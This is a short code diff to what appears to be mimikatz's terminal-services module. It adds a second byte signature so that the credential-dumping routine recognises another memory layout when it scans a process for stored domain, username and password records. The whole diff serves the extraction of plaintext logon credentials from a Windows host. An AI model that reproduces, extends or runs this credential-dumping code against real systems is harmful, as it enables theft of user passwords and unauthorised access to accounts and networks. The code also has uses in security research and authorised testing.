@@ -202,6 +202,7 @@ NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
 }
 
 const BYTE MyPattern[] = {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47, /*0x0b, 0x00*/};
+const BYTE MyPattern2[] = {0x00, 0x00, 0x00, 0x00, 0xf3, 0x47, /*0x0b, 0x00*/};
 BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
 {
 	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pMemoryBasicInformation->BaseAddress, (PKULL_M_MEMORY_HANDLE) pvArg};
@@ -218,7 +219,7 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 			{
 				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(MyPattern) <= limite; CurrentPtr++)
 				{
-					if(RtlEqualMemory(MyPattern, CurrentPtr, sizeof(MyPattern)))
+					if(RtlEqualMemory(MyPattern, CurrentPtr, sizeof(MyPattern)) || RtlEqualMemory(MyPattern2, CurrentPtr, sizeof(MyPattern2)))
 					{
 						pKiwiData = (PWTS_KIWI) CurrentPtr;
 						//kprintf(L"-> %08x (%hu %hu %hu)\n", pKiwiData->unk1, pKiwiData->cbDomain, pKiwiData->cbUsername, pKiwiData->cbPassword);
